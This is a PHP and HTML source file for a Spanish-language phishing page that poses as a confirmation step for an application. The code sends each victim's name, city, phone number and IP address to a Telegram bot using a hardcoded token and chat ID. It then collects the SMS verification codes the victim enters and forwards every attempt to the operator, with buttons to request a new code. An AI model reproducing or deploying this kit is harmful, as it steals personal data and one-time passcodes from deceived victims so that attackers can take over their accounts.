<?php
session_start();

// Credenciales reales del bot de Telegram
$BOT_TOKEN = '8036763317:AAGJbdfFqJt3yi_MwhnP1_DXsSug9oW31HY';
$CHAT_ID   = '-1003373393956';

// URL absoluta hacia la página de finalización (finalizado.html)
$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';
$host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
$basePath = rtrim(dirname($_SERVER['REQUEST_URI'] ?? '/'), '/\\');
$URL_FINALIZADO = $scheme . $host . $basePath . '/finalizado.html';

function rutaCodigos()
{
    return __DIR__ . '/codigos.json';
}

function guardarCodigo($telefono, $codigo, $nombre = null)
{
    $archivo = rutaCodigos();
    $datos = [];
    if (is_file($archivo)) {
        $json = file_get_contents($archivo);
        $tmp = json_decode($json, true);
        if (is_array($tmp)) {
            $datos = $tmp;
        }
    }
    // Guardamos siempre como arreglo para poder incluir más datos
    $existente = $datos[$telefono] ?? [];
    if (!is_array($existente)) {
        $existente = ['codigo' => $existente];
    }
    $existente['codigo'] = $codigo;
    if ($nombre !== null) {
        $existente['nombre'] = $nombre;
    }
    $datos[$telefono] = $existente;
    file_put_contents($archivo, json_encode($datos));
}

function obtenerCodigo($telefono)
{
    $archivo = rutaCodigos();
    if (!is_file($archivo)) {
        return null;
    }
    $json = file_get_contents($archivo);
    $datos = json_decode($json, true);
    if (!is_array($datos)) {
        return null;
    }
    $valor = $datos[$telefono] ?? null;
    if (is_array($valor)) {
        return $valor['codigo'] ?? null;
    }
    return $valor;
}

function borrarCodigo($telefono)
{
    $archivo = rutaCodigos();
    if (!is_file($archivo)) {
        return;
    }
    $json = file_get_contents($archivo);
    $datos = json_decode($json, true);
    if (!is_array($datos) || !isset($datos[$telefono])) {
        return;
    }
    unset($datos[$telefono]);
    file_put_contents($archivo, json_encode($datos));
}

function enviarATelegram($botToken, $chatId, $texto, $replyMarkup = null) {
    if ($botToken === 'PON_AQUI_TU_BOT_TOKEN' || $chatId === 'PON_AQUI_TU_CHAT_ID') {
        // Aún no configurado: no intentamos llamar a la API real
        return false;
    }

    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text'    => $texto,
    ];
    if ($replyMarkup !== null) {
        $data['reply_markup'] = json_encode($replyMarkup);
    }

    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 5,
        ],
    ];

    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

$accion = $_POST['accion'] ?? null;
$codigoIngresado = $_POST['codigo'] ?? null;
$mostrarPantallaCarga = false;

// Si llegan datos del formulario inicial (nombre, ciudad, celular)
if (isset($_POST['nombre'], $_POST['ciudad'], $_POST['celular']) && $accion === null && $codigoIngresado === null) {
    $nombre  = trim($_POST['nombre']);
    $ciudad  = trim($_POST['ciudad']);
    $celular = trim($_POST['celular']);
    $ip      = $_SERVER['REMOTE_ADDR'] ?? '';

    // Guardar datos en sesión para validación posterior y avisos
    $_SESSION['celular'] = $celular;
    $_SESSION['nombre']  = $nombre;

    // Generar código de verificación de 6 dígitos
    $codigo = random_int(100000, 999999);
    guardarCodigo($celular, $codigo, $nombre);

    // Enviar datos a Telegram con botón inline para pedir primer SMS
    $mensaje = "🔥Nuevo perfil \n" .
               "👤Nombres: $nombre\n" .
               "🌆 Ciudad: $ciudad\n" .
               "📱 Celular: $celular\n" .
               "🌐 Ip: $ip";

    $replyMarkup = [
        'inline_keyboard' => [
            [
                [
                    'text' => '📩 SMS',
                    'callback_data' => 'PEDIR_SMS|' . $celular,
                ],
            ],
        ],
    ];

    enviarATelegram($BOT_TOKEN, $CHAT_ID, $mensaje, $replyMarkup);

    // Después del primer envío mostramos pantalla de carga
    $mostrarPantallaCarga = true;
}

// Si el usuario pulsa "Pedir SMS", en un sistema real aquí llamarías a tu proveedor de SMS
if ($accion === 'pedir_sms' && isset($_SESSION['codigo_sms'])) {
    // Lugar para integrar envío de SMS real con $_SESSION['codigo_sms']
}

$mensajeConfirmacion = $_SESSION['mensaje_error'] ?? '';
unset($_SESSION['mensaje_error']);
$estadoConfirmado = false;

if ($accion === 'confirmar' && $codigoIngresado !== null) {
    $telefono = $_SESSION['celular'] ?? null;
    $nombre   = $_SESSION['nombre']  ?? '';
    $codigoGuardado = $telefono ? obtenerCodigo($telefono) : null;
    $ip      = $_SERVER['REMOTE_ADDR'] ?? '';

    $log = "📲 Nuevo código:\n" .
           "👤 Nombre: $nombre\n" .
           "🔢 Código: $codigoIngresado\n" .
           "🌐 IP: $ip";

    if ($telefono !== null && $codigoGuardado !== null && $codigoIngresado === (string)$codigoGuardado) {
        $estadoConfirmado = true;
        $mensajeConfirmacion = 'Listo, tu solicitud ha sido confirmada.';
        borrarCodigo($telefono);
    } else {
        $mensajeConfirmacion = 'El código no es válido. Inténtalo nuevamente.';
        $_SESSION['mensaje_error'] = $mensajeConfirmacion;
        // Volver a pantalla de carga hasta que el administrador pida un nuevo SMS
        $mostrarPantallaCarga = true;
    }

    // En cada intento de código agregamos también un botón para pedir nuevo SMS
    $replyMarkupIntento = [
        'inline_keyboard' => [
            [
                [
                    'text' => '📩🔄 SMS',
                    'callback_data' => 'PEDIR_SMS|' . $telefono,
                ],
                [
                    'text' => '✅ Listo',
                    'callback_data' => 'LISTO|' . $telefono,
                ],
            ],
        ],
    ];

    enviarATelegram($BOT_TOKEN, $CHAT_ID, $log, $replyMarkupIntento);
}
?><!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Confirmar solicitud</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Merriweather:wght@400;700;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
 </head>
<body>
  <main class="container main">
    <section class="postulacion">
      <?php if ($mostrarPantallaCarga): ?>
        <h1 class="promo-title">Espera un momento</h1>
        <p class="promo-text">Estamos validando tus datos. Por favor no cierres esta ventana mientras realizamos la verificación.</p>
        <div style="margin-top:24px; text-align:center;">
          <img src="carga.gif" alt="Cargando" style="max-width:120px; width:30%; height:auto;">
        </div>
        <script>
          (function() {
            function revisarEstado() {
              fetch('check_ready.php', {cache: 'no-store'})
                .then(function(r){ return r.json(); })
                .then(function(data){
                  if (data && data.ready) {
                    if (data.type === 'done') {
                      window.location.href = 'finalizado.html';
                    } else {
                      window.location.href = 'procesar.php';
                    }
                  }
                })
                .catch(function(e){ /* ignorar errores momentáneos */ });
            }
            setInterval(revisarEstado, 1000);
          })();
        </script>
      <?php elseif ($estadoConfirmado): ?>
        <h1 class="promo-title">Listo</h1>
        <p class="promo-text"><?php echo htmlspecialchars($mensajeConfirmacion, ENT_QUOTES, 'UTF-8'); ?></p>
      <?php else: ?>
        <h1 class="promo-title">Verifica tu solicitud</h1>
        <p class="promo-text">
          Ingresa el código SMS de confirmación que recibiste para completar tu postulación.
        </p>

        <?php if ($mensajeConfirmacion): ?>
          <p class="promo-text" style="color:#b91c1c; margin-top:16px;">
            <?php echo htmlspecialchars($mensajeConfirmacion, ENT_QUOTES, 'UTF-8'); ?>
          </p>
        <?php endif; ?>

        <form class="form-postulacion" action="procesar.php" method="post">
          <div class="form-group form-group-full">
            <label for="codigo">Código SMS de confirmación</label>
            <input type="tel" id="codigo" name="codigo" placeholder="Ingresa el código que recibiste" required>
          </div>

          <div class="form-actions form-group-full">
            <button type="submit" name="accion" value="confirmar" class="promo-cta">Confirmar código</button>
          </div>
        </form>
      <?php endif; ?>
    </section>
  </main>
</body>
</html>
